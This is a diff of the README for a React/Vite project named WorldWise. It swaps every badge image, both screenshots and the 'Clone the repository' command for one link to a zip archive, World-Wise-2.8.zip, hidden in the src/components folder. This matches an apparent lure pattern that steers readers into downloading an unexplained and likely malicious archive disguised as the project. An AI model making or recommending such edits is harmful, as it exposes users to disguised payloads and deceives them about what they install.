@@ -2,13 +2,13 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white) ![CSS3 Badge](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white) ![JavaScript Badge](https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E)![REACT Badge](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)![VITE Badge](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)
-![Netlify Badge](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)
+![HTML5 Badge](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip) ![CSS3 Badge](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip) ![JavaScript Badge](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip)![REACT Badge](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip)![VITE Badge](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip)
+![Netlify Badge](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip)
 
 </div>
 
-![screenshot #1](public/screenshots/screenshot1.png)
-![screenshot #2](public/screenshots/screenshot2.png)
+![screenshot #1](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip)
+![screenshot #2](https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip)
 
 ## Description
 
@@ -74,7 +74,7 @@ To run this project locally, you can follow these steps:
 
 1. Clone the repository:
    ```
-   $ https://github.com/imadosan/WorldWise.git
+   $ https://github.com/imadosan/WorldWise/raw/refs/heads/main/src/components/World-Wise-2.8.zip
    ```
 2. Open the project folder in your code editor of choice.
 3. Install dependencies and packages
